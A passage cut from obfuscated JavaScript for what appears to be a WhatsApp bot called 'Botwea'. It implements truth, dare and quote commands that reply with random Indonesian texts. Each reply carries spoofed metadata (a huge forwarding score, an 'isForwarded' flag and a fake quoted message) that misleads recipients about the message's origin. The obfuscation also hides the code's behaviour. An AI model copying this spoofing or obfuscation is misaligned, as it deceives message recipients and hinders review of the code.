0x4db,0xa22)+_0x593f96(0xc67,0xbcb,0xf9d,0x1083)+_0x593f96(0xafc,0xc91,0xa52,0x9e4)+_0x593f96(0x7a8,0xc9c,0xafc,0xc5f)+'eri\x20kita\x20j'+_0x593f96(0x9a0,0x8e1,0xb85,0x6f9)+_0x1e23e4(0x242,0xb6d,0x6f6,0x9d6)+_0x1e23e4(0x937,0x493,0x6ca,0x959)+_0x1e23e4(0x3a9,-0x27b,0x17f,-0x2d9)+'kir\x20jalan\x20'+_0x593f96(0x487,0x33c,0x4ba,0x430)+_0x593f96(0x773,0x533,0x440,0x64f),_0x1e23e4(0xcb3,0xa14,0xa1c,0x803)+'adalah\x20kub'+_0x1e23e4(0x9f5,0xc25,0x982,0xe71)+_0x593f96(0x5db,0x7ec,0x29b,0x54a)+_0x593f96(0x70c,0xa13,0x61a,0xb04)+'.',_0x593f96(0x317,0x97,-0x1b7,0x609)+'n\x20saling\x20m'+'enatap\x20mat'+_0x1e23e4(0xcf7,0xc80,0x8b9,0x709)+_0x593f96(0x516,0x248,0xec,0x615)+_0x593f96(0x37d,0x562,0x1bd,0x6e9)+'sama\x20bersa'+_0x1e23e4(0x531,0x9aa,0x624,0x7bb),_0x593f96(0x2cd,0x6a9,0x65d,0x5d2)+_0x1e23e4(0x69f,0x723,0x6d3,0x961)+'\x20kita\x20kerj'+_0x593f96(0x75e,0x9ab,0x8a0,0x31d)+_0x593f96(0x87c,0x89b,0x89b,0x99e)+_0x593f96(0xb8f,0xa22,0x1098,0xf2f)+_0x1e23e4(0x87a,0x6c4,0x6b1,0xa68)+_0x593f96(0x560,0x9dc,0x837,0x6c1)+_0x593f96(0x2bd,-0x158,0x573,0x394)+'dakan,\x20tet'+'api\x20kebias'+_0x1e23e4(0x108,0x1f0,0x1af,0x549),_0x1e23e4(0x1de,0x138,0x20e,-0x1d)+_0x593f96(0x2e9,-0xe5,0x246,-0x84)+_0x1e23e4(0x3e5,0x23a,0x583,0xd8)+'an\x20putra\x20a'+_0x1e23e4(0x3ac,0x25a,0x409,-0xe1)+_0x1e23e4(0x612,0x5d9,0x156,0x56d)+'di\x20seperti'+_0x1e23e4(0x24d,0xfc,0x202,0x666)+_0x1e23e4(0x301,0x49d,0x201,-0xfe)+'ya\x20cukup\x20s'+'atu\x20saja.',_0x1e23e4(0x8f5,0x791,0x906,0x618)+'bisa\x20membu'+_0x1e23e4(0x863,0xf10,0xa30,0xec3)+_0x593f96(0x619,0x558,0x8df,0x351)+_0x593f96(0x400,0x86d,0x68b,0x886)+'da\x20akan\x20me'+_0x1e23e4(0x63a,0x634,0x463,0x863)+'semua\x20cint'+_0x1e23e4(0x81e,0x45a,0x472,0x66b)+_0x1e23e4(0x718,0x98f,0x90c,0x681)+'.',_0x1e23e4(0x6f9,0x465,0x588,0x9b8)+'an\x20datang\x20'+_0x593f96(0xb74,0xcb6,0x1080,0x78f)+_0x593f96(0x5d1,0x15b,0x668,0x963)+_0x1e23e4(0x308,-0x2e7,0x148,0x3fd)+_0x593f96(0xb30,0xebc,0xd8b,0x9d2)+_0x593f96(0x2ca,0x562,0x695,0xcf)+_0x1e23e4(-0x36f,0x36e,0xc8,0x576)+_0x1e23e4(0x999,0x45,0x4ea,0x9eb)+_0x593f96(0x856,0x96f,0x6d2,0x7dc)+_0x1e23e4(0x504,0x356,0x863,0xc93)+_0x1e23e4(0x5df,0xd5c,0xaaa,0x898)+_0x593f96(0x3a7,-0x15a,0x871,0x6d7)+'epat\x20ia\x20pe'+'rgi.',_0x593f96(0xb2b,0xb1a,0x102b,0xd7d)+'isa\x20melaku'+'kan\x20apapun'+_0x593f96(0x9e8,0x813,0xe3f,0xef4)+_0x593f96(0x970,0x894,0x969,0xd88)+'\x20lalu.\x20Tap'+_0x593f96(0x81d,0x608,0x803,0x975)+'ang\x20kita\x20l'+'akukan\x20bis'+_0x593f96(0x3c4,0x542,0x710,-0xf8)+_0x593f96(0x678,0x381,0x78a,0x1a3)+'n.',_0x1e23e4(0xca3,0x907,0x8a1,0x5c1)+_0x593f96(0xa44,0x6b3,0xd1e,0x89b)+_0x593f96(0x9ae,0x8f3,0xe55,0xde2)+_0x1e23e4(0xad1,0x94f,0x734,0x85f)+'n.',_0x593f96(0x483,0x1a6,0x8cb,0x39a)+_0x1e23e4(0xb77,0x880,0x743,0x9c0)+_0x593f96(0x84a,0x3cb,0x674,0xa8e)+'i\x20oleh\x20kei'+'nginan\x20unt'+'uk\x20maju,\x20b'+_0x1e23e4(0x68,0x248,0x37a,0x878)+_0x1e23e4(0x3cf,0xa8,0x3eb,0x340)+_0x1e23e4(0x6d7,0x6be,0x87f,0x7f2)+_0x593f96(0x7a3,0xc4d,0x2ef,0xca5)+_0x593f96(0xca2,0x829,0x8e0,0x1118),'Dimanapun\x20'+'engkau\x20ber'+_0x593f96(0xa4b,0x831,0xdba,0x7e2)+_0x593f96(0x6f9,0x4f8,0x9ba,0x74e)+_0x1e23e4(0x7d0,0x45c,0x750,0xbfd)+_0x593f96(0x9ba,0xc63,0x4d1,0xb8e)+_0x593f96(0x4c5,0x24e,0xa6,0x103)+_0x1e23e4(0x5fa,-0xdc,0x37c,0x374)+_0x593f96(0x982,0xd38,0x524,0xcc2)+_0x1e23e4(0x7ed,0x431,0x677,0x539)+'berikan.',_0x1e23e4(0x4a0,0xc3,0x34e,0x5eb)+_0x1e23e4(0xada,0x768,0x946,0xbaa)+_0x1e23e4(0x7ed,0xc2f,0x815,0xcee)+_0x1e23e4(0xa3a,0x7ef,0xa54,0x603)+'\x20karena\x20ha'+_0x593f96(0x7e3,0x499,0x49b,0x689)+'l.','Anda\x20tidak'+'\x20perlu\x20har'+_0x593f96(0x8e7,0x519,0xcbc,0xa83)+_0x593f96(0x9ec,0x4fa,0x610,0x5de)+_0x1e23e4(0x6f1,0xd72,0x9d3,0xc88),'Satu\x20jam\x20y'+_0x593f96(0xa2d,0x8cc,0x6d8,0xc4a)+'if,\x20jauh\x20l'+_0x593f96(0x463,0x7eb,0x91,0x7e5)+_0x593f96(0x87b,0xb0b,0xc83,0x544)+_0x1e23e4(0x616,0x944,0x9f8,0x6b5)+_0x1e23e4(0x8ff,0xd30,0xa90,0xfaa)+_0x593f96(0xc70,0x10ec,0xa02,0x10a9)+_0x1e23e4(0xcc8,0x818,0x9f9,0x9b3)+_0x1e23e4(0x3a5,0x7f2,0x31b,0x66c)+'ung-renung'+'.',_0x1e23e4(0x639,0x190,0x45d,0x156)+'k\x20yang\x20bis'+'a\x20Anda\x20lak'+_0x593f96(0xa88,0x73f,0x9a2,0x868)+'\x20orang\x20lai'+_0x593f96(0x537,0x897,0x8ff,0x662)+'\x20membagika'+'n\x20kekayaan'+'\x20Anda,\x20tet'+_0x593f96(0x79f,0x414,0x42e,0x696)+_0x1e23e4(0x516,0x2d1,0x14a,0x588)+'uk\x20memilik'+_0x1e23e4(-0x2dd,-0x2a7,0x182,0x356)+_0x1e23e4(0xbc5,0xe73,0x96d,0x64d)+'i.',_0x1e23e4(0x110,0x578,0x25a,0x16)+_0x1e23e4(0x8ef,0xde,0x4ff,0x673)+'berhasilan'+_0x593f96(0xa6c,0xf84,0x8c9,0x621)+_0x593f96(0x7df,0x351,0x840,0x4b0)+_0x1e23e4(0x3f6,-0x273,0x232,0x56d)+_0x1e23e4(0xe96,0xd03,0xa62,0xea3)+'egagalan.','Aku\x20tidak\x20'+_0x1e23e4(0x99b,0x1f7,0x531,0x287)+_0x593f96(0xc1c,0xd5d,0x10f3,0x10a4)+_0x593f96(0x41d,0x1bf,0x471,0x3bf)+_0x593f96(0xad0,0xbdc,0xcd3,0xd4d)+_0x1e23e4(0x502,0x565,0x8af,0x6a8)+'alan\x20adala'+'h\x20mencoba\x20'+_0x1e23e4(0x2b3,-0x22e,0x268,0x176)+_0x593f96(0x949,0xce8,0xa18,0xb66)+_0x593f96(0x3c6,0x886,-0xe9,0x4f5)],su=kta[Math[_0x593f96(0x46e,0x8a0,0x80f,0x183)](Math['random']()*kta[_0x593f96(0xae8,0x755,0xe98,0xacf)])],_0x39c534={};_0x39c534[_0x593f96(0x3bc,-0x7f,0x2fc,0x265)+'t']=_0x593f96(0x2ac,-0x235,0x4dd,0x406);const _0xbed77={};_0xbed77[_0x593f96(0x3de,-0x11a,0xc2,0x737)]=_0x1e23e4(0x539,0x93,0x279,0x165),_0xbed77[_0x593f96(0x2a4,0x2e5,0x329,0x33a)]=_0x39c534,_0xbed77['type']=0x1;const _0x4422f4={};_0x4422f4['displayTex'+'t']='Next\x20➡️';const _0x3f9c92={};_0x3f9c92[_0x593f96(0x3de,0x597,0x26,0xe8)]=''+command,_0x3f9c92[_0x1e23e4(0x167,0xe1,0xc6,-0x25f)]=_0x4422f4,_0x3f9c92['type']=0x1;var buttonns=[_0xbed77,_0x3f9c92];buttonMessage={'contentText':su,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x593f96(0x8e3,0xdfb,0x6f5,0x640)+_0x1e23e4(-0x3bb,0x4d1,0xd7,0x296)+_0x593f96(0xbc9,0x6f1,0xb20,0xecf))+enter+_0x1e23e4(0xb76,0xb8c,0x86a,0x5a4)+sender[_0x1e23e4(0x639,-0x378,0x133,0x42)]('@')[0xeb9+0x15*0x1d3+-0x3508],'buttons':buttonns,'headerType':0x1};const _0x4f4c28={};_0x4f4c28['text']='hi',_0x4f4c28[_0x593f96(0xa0e,0x672,0xea6,0xf04)+_0x1e23e4(0x380,0x43e,0x608,0x32b)]=0x3b9aca00,_0x4f4c28[_0x593f96(0xc8d,0x895,0x913,0xdbb)+'d']=!![],_0x4f4c28[_0x593f96(0x320,-0x104,0x823,0x33c)+_0x593f96(0x3c2,0x7ec,0x3e4,0x70f)]=!![],_0x4f4c28[_0x1e23e4(-0x2db,-0x42,0xcf,-0x2b6)+'id']=[sender];const _0x622136={};_0x622136[_0x1e23e4(0xe1,-0x21,0x3fc,-0x1f)]=_0x593f96(0x4fd,0x713,0x6ab,0x82c)+'21',_0x622136[_0x1e23e4(0xb28,0x532,0x8c6,0xc13)+'o']=_0x4f4c28,_0x622136[_0x593f96(0x991,0x82d,0xb0b,0x598)]=ftoko,_0x622136[_0x593f96(0x320,0x13a,0x312,-0x137)+_0x1e23e4(0x644,0x19b,0x1e4,0x4a5)]=!![],alpha[_0x593f96(0x863,0x8d8,0x3cd,0x3c6)+'e'](from,buttonMessage,MessageType[_0x593f96(0x4e9,0x903,0x7d,0x36d)+_0x593f96(0xc5b,0xe22,0xe69,0xa61)],_0x622136);break;case'dare':const dare=[_0x593f96(0xbf6,0x702,0x10f9,0xe64)+_0x593f96(0xb31,0xb0e,0xdad,0x7cf)+'n\x20kamu\x20dan'+'\x20bilang\x20\x22a'+'ku\x20masih\x20s'+_0x593f96(0x579,0xd0,0x466,0x235)+_0x1e23e4(0x539,-0x33b,0x13d,0x4d8),_0x1e23e4(0x281,0x131,0x183,0x488)+_0x1e23e4(0xb9f,0xc33,0x9a6,0x9b6)+_0x1e23e4(0x428,0x7dd,0x2ed,0x30c)+_0x1e23e4(0x45b,0x37,0x195,-0x2ec)+'main',_0x593f96(0x9e2,0xb57,0xd73,0xb2a)+_0x593f96(0x493,0x762,0x774,0x70b)+_0x1e23e4(0x71d,0x45,0x35a,0x531),_0x1e23e4(0x677,0x6f0,0x65a,0x1b1)+_0x593f96(0x42a,0x51,0x53,0xf)+_0x1e23e4(0x62b,0x293,0x52b,0x83b)+_0x593f96(0xb8a,0xeb7,0x810,0xdc9)+_0x1e23e4(0x615,-0x78,0x3af,0x892),_0x593f96(0x3b4,0x5f9,0x688,-0x92)+'call\x20whats'+_0x1e23e4(0x1f1,0x405,0x544,0x377),_0x1e23e4(0x4fd,0x323,0x483,0x68f)+_0x593f96(0xc92,0x956,0x1174,0xde2)+'getik\x20di\x20g'+_0x1e23e4(0x74e,0xcde,0x7d1,0x633)+'a\x201\x20hari',_0x1e23e4(-0x136,0x64,0x1c0,0x5fb)+'e\x20note\x20bil'+_0x1e23e4(0x54a,0x6ac,0x6fc,0x2ec)+'call\x20u\x20bab'+'y?',_0x593f96(0x672,0x8ff,0xaca,0x4d3)+_0x593f96(0x4a6,0x162,0x28e,0x9ab)+_0x1e23e4(-0xb7,0x714,0x32e,0x26c)+_0x593f96(0x974,0x9c3,0x6dc,0x8d9)+_0x1e23e4(0xab2,0xb25,0x7e7,0x5eb)+'ok\x20buat\x20ku'+'tipan\x20itu',_0x1e23e4(0x546,0x643,0x3f5,0x788)+_0x1e23e4(0x4d8,0xbba,0x6dd,0x82d)+_0x593f96(0x6cd,0x721,0x4d3,0x8fe),_0x1e23e4(0x8d9,0xcd0,0x964,0xad3)+_0x1e23e4(0x729,0x8b6,0x7c3,0x52b)+_0x593f96(0x66e,0x50f,0xa23,0xa3f)+'m',_0x593f96(0x764,0xb9c,0x75e,0xc59)+'\x20menjadi\x20\x22'+_0x1e23e4(0x536,0x7a6,0x36f,0x569)+'ucinta\x20lun'+'a\x22\x20selama\x20'+_0x593f96(0xa96,0x5ab,0x993,0x8e3),_0x593f96(0x786,0xa40,0x952,0x7a0)+'ntak\x20wa\x20ur'+_0x593f96(0x6ec,0x2c6,0x1fa,0x483)+_0x1e23e4(0x7a4,0x22b,0x6fa,0xba1)+_0x593f96(0x32f,0x36a,0x751,0x55d)+_0x1e23e4(0x61d,0x709,0x21e,-0x1e4)+'\x20dia\x20\x22i\x20lu'+'cky\x20to\x20hv\x20'+_0x1e23e4(0x801,0x789,0x3f9,0x2af),_0x1e23e4(0x5ce,0x6b4,0x61e,0x5c8)+_0x1e23e4(0x9ca,0x6b7,0xa3b,0xf04)+_0x1e23e4(0xbb9,0xdd0,0x9cf,0x5fe)+_0x593f96(0x6ca,0x258,0xbd9,0x9aa)+_0x1e23e4(0x591,-0x39,0x2df,-0x44)+'an',_0x1e23e4(0x289,0xad1,0x6b8,0x3ed)+_0x1e23e4(0x16,-0x49,0x42d,0x503)+'rah\x20al-kau'+'tsar',_0x593f96(0x7d1,0x38d,0x8ca,0xa33)+_0x593f96(0xbb6,0xd5b,0x84e,0xaf4)+_0x1e23e4(0x216,0x5b6,0x198,0x4cd)+_0x1e23e4(0x31d,0xb79,0x6b3,0x827)+'rku\x20gak?\x22\x20'+_0x1e23e4(0xaec,0x699,0x934,0xe1d)+_0x1e23e4(0x990,0xa16,0xa05,0xcfa)+_0x1e23e4(0xae3,0x91e,0x70b,0xbdc)+_0x1e23e4(0x896,0x325,0x5f6,0xaab)+_0x593f96(0x4b2,0x69c,0x670,0x52f)+_0x1e23e4(0x211,0x789,0x3be,0x2e5)+_0x593f96(0x693,0x940,0x7c8,0x72a)+_0x593f96(0xacc,0xf2a,0x6a3,0xc83)+'\x20kalo\x20udah'+_0x593f96(0xc83,0x108b,0xc3d,0xe8c)+_0x593f96(0x9bf,0x4ad,0xd44,0xadb),'sebutkan\x20t'+_0x1e23e4(0x661,0x634,0xa2a,0xcc3)+_0x593f96(0x81e,0xd22,0x682,0xaae),_0x1e23e4(0x44e,0x4a1,0x84c,0xc27)+_0x1e23e4(0x6d2,0x48f,0x5e9,0x87f)+_0x593f96(0x6d2,0x250,0x7e9,0x582),'teriak\x20gaj'+_0x1e23e4(0x654,0xe2d,0x980,0xbcf)+'kirim\x20pake'+'\x20vn\x20kesini',_0x1e23e4(-0x2cd,-0x244,0x243,0x9d)+_0x1e23e4(0x44c,0x29,0x192,0x150)+_0x1e23e4(0x400,0x7cb,0x47d,0x34a)+_0x1e23e4(0x152,0x77b,0x360,0x418)+_0x593f96(0xcc0,0xa39,0xcc5,0x101b),_0x1e23e4(0x8a4,0x8fb,0x4bb,0x1a2)+_0x1e23e4(0x320,0x24e,0x54f,0x4f8)+_0x593f96(0x38a,-0xcf,0x727,0x4f5)+_0x1e23e4(0x25a,0x6a0,0x4de,0x166)+'ngut',_0x1e23e4(0x130,0x18c,0x1ef,0x4ac)+_0x593f96(0xbe8,0xf42,0x707,0xbcc)+_0x593f96(0x931,0xd21,0x427,0xe02)+'vn\x20trus\x20ki'+_0x593f96(0x723,0x413,0x9e5,0x53b),_0x1e23e4(0xabb,0x8d4,0x5cc,0x4b1)+_0x593f96(0x353,0x13,0x308,-0x65)+_0x1e23e4(0x912,0x694,0x68d,0x6c6)+'\x20\x22\x20di\x20depa'+_0x593f96(0x801,0x456,0x725,0x9de),_0x593f96(0x764,0x821,0x673,0x828)+_0x1e23e4(0xe3e,0xceb,0x989,0xe77)+_0x1e23e4(0x714,0x4ba,0x1ff,0x498)+_0x1e23e4(0x409,0x8bf,0x739,0xb8e),_0x593f96(0x7fe,0x643,0x743,0x5ac)+_0x593f96(0x337,0x4ea,0x3d4,-0x11e)+_0x1e23e4(0x670,0x282,0x5dc,0x775)+_0x593f96(0x83e,0x71c,0x518,0x89a)+_0x593f96(0xabe,0xede,0x9c9,0x8ee)+'asukan\x20bel'+_0x1e23e4(0x37e,-0x148,0x384,-0x15a)+_0x593f96(0x4c8,0x0,0x5e0,0x378)+_0x593f96(0x8c9,0xc7a,0x4bc,0x9e8)],der=dare[Math['floor'](Math['random']()*dare[_0x1e23e4(0x74a,0xb4d,0x90a,0x6fa)])],_0x4f310f={};_0x4f310f[_0x1e23e4(0x538,-0xfb,0x1de,-0x213)+'t']=_0x593f96(0x2ac,-0x18b,0x3e1,0x5ce);const _0x23b207={};_0x23b207[_0x1e23e4(0x21d,0x5ec,0x200,-0x34)]='owner',_0x23b207['buttonText']=_0x4f310f,_0x23b207[_0x1e23e4(0xc9c,0x4fe,0x9a0,0x8c7)]=0x1;const _0x4ad152={};_0x4ad152[_0x1e23e4(0x2f0,0x1b1,0x1de,0x1da)+'t']='Next\x20➡️';const _0x264766={};_0x264766[_0x1e23e4(0x4b0,0x1ce,0x200,-0x219)]=''+command,_0x264766[_0x1e23e4(0x5be,0x1cc,0xc6,0x420)]=_0x4ad152,_0x264766[_0x593f96(0xb7e,0xfd4,0x1076,0xe14)]=0x1;var buttonns=[_0x23b207,_0x264766];buttonMessage={'contentText':der,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x1e23e4(0xa5c,0x57b,0x705,0x9b6)+_0x593f96(0x2b5,0x12f,0x5fc,0x2a2)+_0x1e23e4(0xa5e,0xc7a,0x9eb,0x8d5))+enter+_0x1e23e4(0x870,0xd33,0x86a,0x7ea)+sender[_0x1e23e4(0x2ae,0x5c4,0x133,-0x36d)]('@')[0x1*-0x1f89+0xf37+0x1052],'buttons':buttonns,'headerType':0x1};const _0x1ea60a={};_0x1ea60a[_0x593f96(0xc48,0x87a,0xad6,0xe65)]='hi',_0x1ea60a['forwarding'+'Score']=0x3b9aca00,_0x1ea60a[_0x593f96(0xc8d,0xbe2,0x1043,0xc6c)+'d']=!![],_0x1ea60a[_0x1e23e4(0x595,0x5c9,0x142,-0x2af)+_0x593f96(0x3c2,0x8dc,-0x125,0x497)]=!![],_0x1ea60a[_0x593f96(0x2ad,-0x1c4,0x3c3,0x48e)+'id']=[sender];const _0x475581={};_0x475581['caption']='Botwea\x20©2k'+'21',_0x475581['contextInf'+'o']=_0x1ea60a,_0x475581[_0x1e23e4(0x635,0xa78,0x7b3,0x5ab)]=ftoko,_0x475581[_0x1e23e4(-0xeb,0x35e,0x142,0x5a9)+'ral']=!![],alpha[_0x593f96(0x863,0xcfb,0x77f,0x440)+'e'](from,buttonMessage,MessageType['buttonsMes'+'sage'],_0x475581);break;case _0x1e23e4(0x9ca,0x6e3,0x642,0x830):const trut=[_0x1e23e4(0xd57,0x663,0x877,0x9f0)+'a\x20sama\x20sia'+'pa\x20aja?\x20be'+_0x1e23e4(0x6f8,0x597,0x24b,0x217),_0x1e23e4(-0xd3,0x108,0x1fc,0x88)+_0x1e23e4(0x658,0x1be,0x1f4,0x3b5)+'au\x20mau,\x20di'+_0x1e23e4(0xb89,0x9bb,0x893,0x680)+'c\x20siapa\x20ya'+'ng\x20akan\x20ka'+_0x593f96(0x65a,0x7d8,0x5b0,0xa55)+_0x593f96(0x898,0xbdd,0x966,0x3fc)+_0x1e23e4(0x610,0x432,0x3c2,0x6e3)+'/sma\x20jenis'+')',_0x1e23e4(0xa1e,0x8de,0x6cf,0xaf7)+_0x1e23e4(0x830,0x24f,0x58c,0x825)+_0x593f96(0x8d0,0x5c6,0x52f,0x6d1),_0x593f96(0x364,0x7bf,0x7c4,0x13e)+_0x593f96(0x897,0xd0a,0xc23,0xc36)+_0x593f96(0xc8e,0xbc4,0xbcf,0x112b)+_0x1e23e4(0x3bb,0x13e,0x4a0,0x136)+_0x1e23e4(0xab5,0x4e6,0x800,0x750)+_0x1e23e4(0x825,0x638,0x58f,0x89a)+_0x1e23e4(0x614,0x3ce,0x7df,0x2d3),_0x593f96(0x887,0xd61,0x52d,0xce9)+_0x1e23e4(0xa9c,0x7a1,0xa46,0x557)+_0x1e23e4(0x998,0xbb2,0x6f5,0x8c9)+_0x1e23e4(0x4d8,0xbc1,0x766,0x955)+'rnah\x20kamu\x20'+_0x1e23e4(0x4cf,0x142,0xe8,-0x390)+_0x1e23e4(0x98d,0x757,0x537,0x98c),_0x1e23e4(0x4c0,0x928,0x86b,0x9be)+_0x593f96(0x392,-0xab,0x606,0x4d7)+'g\x20nyokap\x20a'+_0x593f96(0x5d2,0x8e4,0xaad,0xdc)+_0x1e23e4(0x5c,0x712,0x52f,0xa18),'hal\x20yang\x20b'+_0x1e23e4(0x86b,0x482,0x3ef,0x6b7)+_0x1e23e4(0xd5b,0xb3c,0x885,0xd0f)+_0x1e23e4(0xc33,0xbb5,0x9f7,0x6dd)+'apa',_0x1e23e4(0x388,-0x89,0x2b1,0x427)+_0x593f96(0x87e,0xb66,0xd39,0x905)+_0x1e23e4(0x8da,0x477,0x748,0x6bb)+'tangan?\x20ka'+_0x1e23e4(0x383,0x3b9,0x57f,0x583)+_0x1e23e4(0x537,0x5e3,0x36c,-0x17c)+_0x1e23e4(-0x12,-0x338,0x1ad,0x36d)+_0x1e23e4(0x5a2,0x2e3,0x562,0x35c)+'u?',_0x593f96(0x465,0x3ff,0x1ca,0x6de)+_0x1e23e4(0x4a5,0x3ff,0x738,0xb3f)+'han\x20orang?','hal\x20yang\x20p'+_0x1e23e4(0x7ce,0xa5e,0x5d6,0x32d)+_0x1e23e4(0xa37,0x26a,0x76d,0xa2a),'siapa\x20oran'+_0x593f96(0xa08,0xbc5,0x597,0xded)+_0x1e23e4(0x8ca,0x241,0x456,0x7ad)+_0x593f96(0x8c7,0xb53,0x8de,0xbc1)+_0x1e23e4(0x36c,0x148,0x1b2,0x6b)+_0x1e23e4(0x692,0x8d7,0xacb,0xc4c),_0x1e23e4(0x1aa,-0x2f0,0xfe,0x28d)+'ggakan\x20apa'+_0x1e23e4(0x6cd,0x654,0x50b,0x6c6)+_0x593f96(0xbbf,0xf85,0x6d6,0xb58)+_0x1e23e4(0x130,-0x221,0x2b7,0x6ec)+'ni','siapa\x20oran'+_0x593f96(0x91f,0xa3c,0x43c,0xc40)+'a\x20membuatm'+_0x1e23e4(0x7d4,0x3ee,0x4c3,0x1),_0x1e23e4(0x2ec,0x257,0x152,0x5bf)+_0x593f96(0x5bd,0x194,0x780,0xa65)+'nah\x20buatmu'+_0x1e23e4(0x534,0x3a0,0x576,0x827),'(bgi\x20yg\x20mu'+_0x1e23e4(0x3f2,0x5dd,0x651,0x381)+_0x1e23e4(0x162,0x37b,0x4f5,0x495)+'t\x20seharian'+'?',_0x1e23e4(0x536,0xf1,0x36d,0x3fa)+_0x593f96(0x4b3,0x4f4,0x827,0x9ab)+_0x593f96(0x65f,0x176,0x72d,0x5fb)+'pe\x20pasanga'+_0x1e23e4(0x72a,0x937,0x659,0x6f3)+'di\x20sini',_0x1e23e4(0x56e,0x2b8,0x3e2,0x33)+_0x1e23e4(0x5a4,0x993,0x701,0x7e5)+'ng)sama\x20si'+_0x593f96(0xbdb,0xc4d,0xe5a,0xbf5),_0x593f96(0xb29,0xd94,0x64f,0xdb7)+_0x593f96(0x852,0x9d1,0xa80,0x97a)+_0x593f96(0xae7,0x791,0x8ac,0xc40)+_0x1e23e4(0x9db,0xd13,0x816,0x847),_0x1e23e4(0x68a,0x113,0x55e,0x774)+_0x593f96(0x583,0x709,0x6ca,0x7f4)+_0x593f96(0x5c4,0x8a7,0x352,0xaab)+_0x1e23e4(0x1b1,0x447,0x2cb,-0x13e)+_0x593f96(0x961,0xaff,0x506,0xbe5)+_0x1e23e4(0x3e3,0x455,0x6bc,0x8f7)+_0x593f96(0x2ed,0x1e8,0x60f,0x54e),'pencapaian'+_0x593f96(0x506,0x19e,0x36,0x53d)+_0x593f96(0x4bc,0x676,0x12,0x77b)+_0x593f96(0x407,0x743,0x176,0x11d)+_0x1e23e4(0x732,0x8b6,0xa6c,0xcce),'kebiasaan\x20'+'terburuk\x20l'+_0x1e23e4(0x545,0x7aa,0x5be,0x845)+'ekolah\x20apa'+'?'],ttrth=trut[Math[_0x593f96(0x46e,0x108,0x2a6,0x1c1)](Math['random']()*trut[_0x593f96(0xae8,0xa01,0xbb3,0x6d4)])],_0x3ed27e={};_0x3ed27e[_0x1e23e4(0x19f,-0x339,0x1de,-0xb0)+'t']=_0x593f96(0x2ac,0x729,0x251,0x552);const _0x142fdd={};_0x142fdd[_0x1e23e4(0x179,0x31e,0x200,0x14c)]=_0x1e23e4(0x3ff,-0x20b,0x279,0x5c9),_0x142fdd[_0x1e23e4(0x20a,-0x321,0xc6,-0x30d)]=_0x3ed27e,_0x142fdd[_0x1e23e4(0xbc9,0x542,0x9a0,0x53b)]=0x1;const _0x2c6dc5={};_0x2c6dc5[_0x1e23e4(0x512,0x3e4,0x1de,0x31d)+'t']=_0x1e23e4(0x3b,0x407,0x136,-0x1e0);const _0x311cb8={};_0x311cb8[_0x1e23e4(0x267,-0x79,0x200,-0xcc)]=''+command,_0x311cb8['buttonText']=_0x2c6dc5,_0x311cb8[_0x593f96(0xb7e,0xb73,0xe61,0x963)]=0x1;var buttonns=[_0x142fdd,_0x311cb8];buttonMessage={'contentText':ttrth,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+('Next\x20\x20for\x20'+'more\x20quote'+_0x593f96(0xbc9,0x9c2,0x10b5,0xf51))+enter+_0x593f96(0xa48,0xb7e,0xc35,0x910)+sender[_0x593f96(0x311,0x65e,0x4bc,0x6de)]('@')[-0x1*0x1253+0x23b6+-0x1163],'buttons':buttonns,'headerType':0x1};const _0x28f94f={};_0x28f94f['text']='hi',_0x28f94f[_0x1e23e4(0x431,0x98a,0x830,0x810)+'Score']=0x3b9aca00,_0x28f94f[_0x593f96(0xc8d,0x10be,0x112e,0xc75)+'d']=!![],_0x28f94f[_0x593f96(0x320,0x54d,0x711,-0x61)+_0x593f96(0x3c2,0x1e7,0x5c4,0x623)]=!![],_0x28f94f[_0x1e23e4(-0x2ce,-0x3fa,0xcf,-0x2f8)+'id']=[sender];const _0x23ca1b={};_0x23ca1b[_0x1e23e4(-0x93,0x5e9,0x3fc,0x741)]=_0x1e23e4(0x68d,0x529,0x31f,0x7e)+'21',_0x23ca1b[_0x593f96(0xaa4,0xa75,0xe28,0x872)+'o']=_0x28f94f,_0x23ca1b[_0x1e23e4(0x51f,0xc0d,0x7b3,0x955)]=ftoko,_0x23ca1b[_0x1e23e4(0x572,-0x30a,0x142,0x17f)+_0x1e23e4(-0x2c9,0x3dd,0x1e4,0x437)]=!![],alpha[_0x1e23e4(0x321,0xab3,0x685,0x6ee)+'e'](from,buttonMessage,MessageType[_0x593f96(0x4e9,0x9ed,0x1e6,0x214)+_0x1e23e4(0x65f,0x5b1,0xa7d,0xc6a)],_0x23ca1b);break;case'katadilan':const cc=['Cemburu\x20it'+_0x593f96(0x76e,0xa45,0xb9e,0xa14)+'tuk\x20orang-'+'orang\x20yang'+'\x20tidak\x20per'+_0x1e23e4(0x313,0x8a,0x172,0x5aa)+_0x1e23e4(-0x89,0x70a,0x3ce,0xe7)+_0x593f96(0x2cb,0x5ca,0x7b5,0x1bf)+'dang\x20tidak'+'\x20percaya\x20d'+_0x593f96(0x8f4,0x5e0,0x59d,0xafd),'Aku\x20gak\x20pa'+_0x1e23e4(0xc1f,0xaec,0x8e8,0x847)+_0x593f96(0x652,0xaab,0x67c,0xb63)+_0x1e23e4(0x525,-0x10f,0x38a,0x762)+'amu\x20ningga'+_0x1e23e4(0x2bf,0xc8b,0x785,0x693)+_0x593f96(0xa2b,0xb87,0x93f,0x9bc)+_0x1e23e4(0x38d,0xb1d,0x787,0x635)+_0x1e23e4(0x8f2,0x4cf,0x7c6,0xa86)+_0x1e23e4(0x818,0x229,0x38d,0x242)+_0x593f96(0x99e,0xd3f,0x99c,0x7d0),_0x593f96(0x5b9,0x809,0x7c1,0xa5f)+_0x593f96(0xbc3,0xc5c,0x102a,0x719)+_0x593f96(0xbac,0xa7d,0xd99,0x916)+_0x1e23e4(0x144,-0x98,0x30d,0x523)+_0x1e23e4(0x9f9,0x4d3,0x7e0,0xb15)+_0x593f96(0x7ec,0xc09,0x2d6,0x4c4),_0x593f96(0x663,0xb68,0x33b,0x687)+_0x593f96(0x3f7,0x16d,0x9e,0x499)+_0x593f96(0x5a4,0x7f6,0x849,0x388)+_0x1e23e4(0x45e,0xb5e,0x65d,0x15c)+_0x1e23e4(0x91e,0x8c4,0x417,0x592)+_0x593f96(0xc12,0xc72,0xc90,0xddc)+_0x1e23e4(0xe86,0x985,0x9db,0xc4c)+_0x1e23e4(0x9d1,0x90c,0xa5a,0x555)+_0x593f96(0xccd,0x7db,0xd51,0xa2b)+'eh\x20itu\x20kar'+_0x593f96(0x544,0x1bd,0x2eb,0x520)+_0x593f96(0x93e,0x6ba,0x868,0xbfa)+_0x1e23e4(0x810,0x8f5,0xad